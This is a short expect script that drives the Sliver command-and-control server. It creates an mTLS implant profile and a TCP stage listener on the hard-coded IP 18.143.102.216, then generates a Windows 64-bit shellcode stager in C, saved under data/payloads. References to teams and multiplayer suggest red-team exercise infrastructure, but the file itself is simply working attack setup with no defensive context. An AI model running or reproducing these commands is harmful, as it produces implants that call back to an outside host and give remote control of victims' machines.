#!/usr/bin/expect

set payload_c "./data/payloads/win_stager.c"

# Prepare configs file for teams
exec ./tools/sliver/get_configs.sh

# Ativate Sliver server
spawn sliver-server

# Wait for sliver-server to start (you can adjust the sleep duration as needed)
sleep 0.1

# # Continue using sliver-server
# send "multiplayer\r"
# send "operators\r"

# Generate stager
send "profiles new --mtls 18.143.102.216:8080 --skip-symbols --format shellcode --arch amd64 win64\r"
send "stage-listener --url tcp://18.143.102.216:1234 --profile win64\r"
send "jobs\r"
send "generate stager --lhost 18.143.102.216 --lport 1234 --protocol tcp --arch amd64 --format c --save $payload_c\r"

# # Enter interactive mode, allowing you to manually interact with sliver-server
# interact
